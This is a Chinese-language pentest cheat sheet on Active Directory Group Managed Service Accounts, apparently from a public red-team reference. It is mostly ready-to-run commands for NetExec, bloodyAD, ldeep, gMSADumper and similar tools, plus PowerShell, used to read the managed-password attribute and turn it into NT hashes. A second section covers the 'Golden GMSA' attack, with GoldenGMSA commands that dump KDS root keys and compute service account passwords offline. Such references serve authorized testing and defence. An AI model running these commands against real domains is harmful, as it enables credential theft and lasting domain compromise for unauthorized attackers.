# 密码 - GMSA

## 读取 GMSA 密码 (Reading GMSA Password)

> 为了用作服务帐户而创建的用户帐户很少会更改其密码。组托管服务帐户 (Group Managed Service Accounts, GMSAs) 提供了一种更好的方法 (从 Windows 2012 开始)。密码由 AD 管理，并且每 30 天自动轮换为一个随机生成的 256 字节的密码。

### Active Directory 中的 GMSA 属性 (GMSA Attributes in the Active Directory)

* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - 存储可以访问 GMSA 密码的安全主体 (security principals)。
* `msds-ManagedPassword` - 此属性包含一个带有组托管服务帐户密码信息的 BLOB。
* `msDS-ManagedPasswordId` - 此构造属性包含组 MSA 当前托管密码数据的密钥标识符。
* `msDS-ManagedPasswordInterval` - 此属性用于检索组 MSA 的托管密码自动更改前的天数。

### 从 Active Directory 提取 NT 哈希 (Extract NT hash from the Active Directory)

* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

  ```ps1
  netexec ldap 10.10.10.10 -u user -p pass --gmsa

  # 使用 --lsa 获取 GMSA ID
  netexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
  netexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
  ```

* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

  ```ps1
  bloodyAD --host 10.10.10.10 -d crash.lab -u john -p 'Pass123*' get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword
  ```

* [franc-pentest/ldeep](https://github.com/franc-pentest/ldeep)

  ```ps1
  ldeep ldap -s dc1.domain.local -u 'username' -p 'P@ssw0rd' -d domain.local gmsa
  ```

* [rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)

  ```ps1
  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
  ```

* [micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

   ```powershell
  python3 gMSADumper.py -u User -p Password1 -d domain.local
  ```
  
* Active Directory Powershell

  ```ps1
  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
  $blob = $gmsa.'msDS-ManagedPassword'
  $mp = ConvertFrom-ADManagedPasswordBlob $blob
  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
  ```

* [kdejoyce/gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) 基于 Active Directory PowerShell 模块

## 伪造黄金 GMSA (Forging Golden GMSA)

> **Golden Ticket** (黄金票据) 攻击和 **Golden GMSA** (黄金 GMSA) 攻击之间的一个显著区别是，它们没有轮换 KDS 根密钥的秘密。因此，如果 KDS 根密钥被泄露，则无法保护与其关联的 gMSA。

:warning: 你无法"强制重置" gMSA 密码，因为 gMSA 的密码从不改变。密码是从 KDS 根密钥和 `ManagedPasswordIntervalInDays` 派生的，因此每个域控制器在任何时候都可以计算出密码是什么、过去是什么以及未来任何时间的密码将是什么。

* 使用 [GoldenGMSA](https://github.com/Semperis/GoldenGMSA)

    ```ps1
    # 枚举所有 gMSA
    GoldenGMSA.exe gmsainfo
    # 查询特定的 gMSA
    GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112

    # 导出所有 KDS 根密钥
    GoldenGMSA.exe kdsinfo
    # 导出一个特定的 KDS 根密钥
    GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb

    # 计算 gMSA 密码
    # --sid <gMSA SID>: gMSA 的 SID (必选)
    # --kdskey <Base64-encoded blob>: Base64 编码的 KDS 根密钥
    # --pwdid <Base64-encoded blob>: msds-ManagedPasswordID 属性值的 Base64
    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # 需要对域的特权访问
    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # 需要 LDAP 访问
    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # 离线模式
    ```

## 参考资料 (References)

* [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
* [Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)
* [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
